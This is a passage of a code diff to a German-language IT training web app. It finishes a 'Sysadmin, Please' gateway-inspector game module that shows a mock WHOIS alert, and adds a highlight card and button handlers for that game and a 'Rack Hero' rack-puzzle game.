+      alert(`🌐 WHOIS / DNS LOOKUP TOOL:\n\nQuell-IP: ${fall.srcIp}\nRouting: ${fall.ingress}\nZiel-Port: ${fall.dstPort} (${fall.proto})\n\nIANA / RIPE DB Status:\n- Autonomes System: AS3320 / AS15169\n- Country: DE / US\n- Abuse Contact: abuse@ripe.net\n- PTR Record: ${fall.srcIp.replace(/\\./g, "-")}.dynamic.pool.isp.de`);
+    }
+  };
+
+  window.SYSADMIN_PLEASE = SYSADMIN;
+})();
 
 /* ---- f_triage.js ---- */
 // f_triage.js - Adress-Triage (Konzept 1 + 9): Ist die Adresse Netzadresse, nutzbarer Host, Broadcast oder gehört sie nicht ins Netz?
@@ -69223,6 +71960,33 @@ window.FANCY_SND = {"boom":"data:audio/mpeg;base64,SUQzBAAAAAAAaFRJVDIAAAAMAAADR
           </div>
         </div>
 
+        <!-- HIGHLIGHT: Die beiden neuen Browser-Games (Papers Please & Backpack Hero Vibe) -->
+        <div class="arenaCard full devHighlightCard" style="border: 2px solid #38bdf8; background: radial-gradient(circle at 50% 20%, rgba(14, 165, 233, 0.22) 0%, rgba(15, 23, 42, 0.95) 100%); margin-bottom: 8px; box-shadow: 0 0 25px rgba(56, 189, 248, 0.25);">
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 6px; flex-wrap:wrap; gap:4px;">
+            <div style="display:flex; align-items:center; gap:8px;">
+              <span style="font-size:24px;">⭐</span>
+              <div>
+                <h3 style="color:#38bdf8; margin:0; font-size:14px; text-transform:uppercase; letter-spacing:0.04em;">Neue Indie-Hits: Games der nächsten Generation</h3>
+                <span style="font-size:10px; color:#bae6fd;">Inspiriert von 'Papers, Please' &amp; 'Backpack Hero'</span>
+              </div>
+            </div>
+            <span class="devStatusBadge live" style="background:rgba(56, 189, 248, 0.25); color:#38bdf8; border-color:#38bdf8;">🔥 Neu / Highlight</span>
+          </div>
+          <p style="margin:4px 0 10px; font-size:11.5px; line-height:1.45; color:#e2e8f0;">
+            Zwei radikal kreative Spielmechaniken für maximalen Lerneffekt und Suchtfaktor: Werde Gateway-Inspektor am Firmen-Border oder organisiere das 42U-Rechenzentrum als taktiles Tetris-Puzzle!
+          </p>
+          <div style="display:grid; grid-template-columns: 1fr 1fr; gap:8px;">
+            <button type="button" class="primary" id="hubStartSysadminPleaseBtn" style="font-size:11px; padding:10px 12px; background:linear-gradient(135deg, #0284c7, #0369a1); border-color:#38bdf8; font-weight:800; display:flex; align-items:center; justify-content:center; gap:6px;">
+              <span>👮</span>
+              <span>Sysadmin, Please (Gateway-Inspektor) ➔</span>
+            </button>
+            <button type="button" class="primary" id="hubStartRackHeroBtn" style="font-size:11px; padding:10px 12px; background:linear-gradient(135deg, #059669, #047857); border-color:#34d399; font-weight:800; display:flex; align-items:center; justify-content:center; gap:6px;">
+              <span>🗄️</span>
+              <span>Rack Hero: 19-Zoll Tetris ➔</span>
+            </button>
+          </div>
+        </div>
+
         <!-- 2. Interaktives IT-Labor / Sandboxes -->
         <div class="arenaCard full devHighlightCard" style="border: 2px solid #10b981; background: rgba(6, 30, 20, 0.95); margin-bottom: 8px;">
           <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 6px; flex-wrap:wrap; gap:4px;">
@@ -69336,6 +72100,12 @@ window.FANCY_SND = {"boom":"data:audio/mpeg;base64,SUQzBAAAAAAAaFRJVDIAAAAMAAADR
         if (typeof window.startOsiInvaders === "function") window.startOsiInvaders();
       };
     }
+
+    // Hookups für die beiden neuen Highlights
+    const btnSysadmin = $("hubStartSysadminPleaseBtn");
+    if (btnSysadmin) btnSysadmin.onclick = () => { schliesseModal(); if (window.SYSADMIN_PLEASE) window.SYSADMIN_PLEASE.oeffne(); };
+    const btnRack = $("hubStartRackHeroBtn");
+    if (btnRack) btnRack.onclick = () => { schliesseModal(); if (window.RACK_HERO) window.RACK_HERO.oeffne(); };
 
     // Hookups für die neuen Research-Module
     const btnSql = $("hubBtnSqlKrimi");
